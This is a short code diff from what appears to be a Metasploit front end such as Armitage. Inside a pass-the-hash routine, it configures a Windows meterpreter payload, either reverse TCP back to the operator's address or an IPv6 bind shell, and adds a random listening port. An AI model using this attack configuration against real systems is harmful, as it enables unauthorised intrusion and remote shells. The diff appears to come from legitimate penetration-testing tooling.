@@ -194,6 +194,7 @@ sub pass_the_hash {
 				if ([$reverse isSelected]) {
 					%options["LHOST"] = $MY_ADDRESS;
 					%options["PAYLOAD"] = "windows/meterpreter/reverse_tcp";
+					%options["LPORT"] = randomPort();
 				}
 				else if (isIPv6($host)) {
 					%options["PAYLOAD"] = "windows/meterpreter/bind_ipv6_tcp";
